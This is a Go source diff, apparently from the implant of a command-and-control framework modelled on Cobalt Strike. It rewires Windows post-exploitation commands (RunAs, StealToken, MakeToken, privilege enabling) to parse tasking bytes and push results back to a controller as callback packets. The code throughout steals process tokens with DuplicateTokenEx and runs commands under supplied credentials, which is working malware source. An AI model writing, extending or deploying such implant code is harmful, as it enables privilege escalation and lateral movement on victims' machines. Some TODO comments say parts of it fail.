@@ -4,6 +4,7 @@ import (
 	"errors"
 	"fmt"
 	"golang.org/x/sys/windows"
+	"main/packet"
 	"unsafe"
 )
 
@@ -53,7 +54,11 @@ func closeToken(token windows.Token) error {
 }
 
 // TODO when call createProcessWithLogonW will generate a strange error
-func RunAs(domain []byte, username []byte, password []byte, cmd []byte) ([]byte, error) {
+func RunAs(b []byte) error {
+	domain, username, password, cmd, err := parseRunAs(b)
+	if err != nil {
+		return err
+	}
 	lpUsername := windows.StringToUTF16Ptr(string(username))
 	lpDomain := windows.StringToUTF16Ptr(string(domain))
 	lpPassword := windows.StringToUTF16Ptr(string(password))
@@ -69,9 +74,9 @@ func RunAs(domain []byte, username []byte, password []byte, cmd []byte) ([]byte,
 	}
 
 	// create anonymous pipe
-	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
+	err = windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
 	if err != nil {
-		return nil, errors.New(fmt.Sprintf("CreatePipe error: %s", err))
+		return errors.New(fmt.Sprintf("CreatePipe error: %s", err))
 	}
 	defer windows.CloseHandle(hWPipe)
 	defer windows.CloseHandle(hRPipe)
@@ -83,7 +88,7 @@ func RunAs(domain []byte, username []byte, password []byte, cmd []byte) ([]byte,
 	// https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
 	_, _, err = createProcessWithLogonW.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON_WITH_PROFILE, 0, uintptr(unsafe.Pointer(lpCommandLine)), CREATE_DEFAULT_ERROR_MODE, 0, uintptr(unsafe.Pointer(startUpInfo)), uintptr(unsafe.Pointer(procInfo)))
 	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return nil, errors.New(fmt.Sprintf("CreateProcessWithLogonW error: %s", err))
+		return errors.New(fmt.Sprintf("CreateProcessWithLogonW error: %s", err))
 	}
 	defer windows.CloseHandle(procInfo.Process)
 	defer windows.CloseHandle(procInfo.Thread)
@@ -96,10 +101,13 @@ func RunAs(domain []byte, username []byte, password []byte, cmd []byte) ([]byte,
 	var read windows.Overlapped
 	_ = windows.ReadFile(hRPipe, buf, nil, &read)
 
-	return buf[:read.InternalHigh], nil
+	result := buf[:read.InternalHigh]
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, result)
+	packet.PushResult(finalPacket)
+	return nil
 }
 
-func GetPrivs(privs []string) (string, error) {
+func getPrivs(privs []string) (string, error) {
 	result := ""
 	var token windows.Token
 	// try to get privileges from stolen token
@@ -148,15 +156,30 @@ func GetPrivs(privs []string) (string, error) {
 	return result, nil
 }
 
+func GetPrivsByte(b []byte) error {
+	privs, err := parseGetPrivs(b)
+	if err != nil {
+		return err
+	}
+	result, err := getPrivs(privs)
+	if err != nil {
+		return err
+	}
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte(result))
+	packet.PushResult(finalPacket)
+	return nil
+}
+
 // always remember to release handle
 func Rev2self() error {
 	_ = closeToken(stolenToken)
 	return windows.RevertToSelf()
 }
 
-func StealToken(pid uint32) error {
+func StealToken(b []byte) error {
+	pid := packet.ReadInt(b)
 	// getprivs first
-	_, _ = GetPrivs(privileges)
+	_, _ = getPrivs(privileges)
 	ProcessHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
 	if err != nil {
 		ProcessHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
@@ -183,18 +206,21 @@ func StealToken(pid uint32) error {
 		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
 	}
 	isTokenValid = true
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte("Steal token success"))
+	packet.PushResult(finalPacket)
 	return nil
 }
 
 // TODO it seems this func didn't work
-func MakeToken(domain []byte, username []byte, password []byte) error {
+func MakeToken(b []byte) error {
+	domain, username, password, err := parseMakeToken(b)
 	var token windows.Token
 	lpUsername := windows.StringToUTF16Ptr(string(username))
 	lpDomain := windows.StringToUTF16Ptr(string(domain))
 	lpPassword := windows.StringToUTF16Ptr(string(password))
 	// TODO using LOGON32_LOGON_BATCH always say username/password error even if i'm input correct password
 	// using LOGON32_LOGON_NEW_CREDENTIALS always return no error but seems useless
-	_, _, err := logonUserA.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, uintptr(unsafe.Pointer(&token)))
+	_, _, err = logonUserA.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, uintptr(unsafe.Pointer(&token)))
 	if err != nil && err != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("LogonUserA error: %s", err))
 	}
@@ -208,5 +234,7 @@ func MakeToken(domain []byte, username []byte, password []byte) error {
 		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
 	}
 	isTokenValid = true
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte("Make token success"))
+	packet.PushResult(finalPacket)
 	return nil
 }
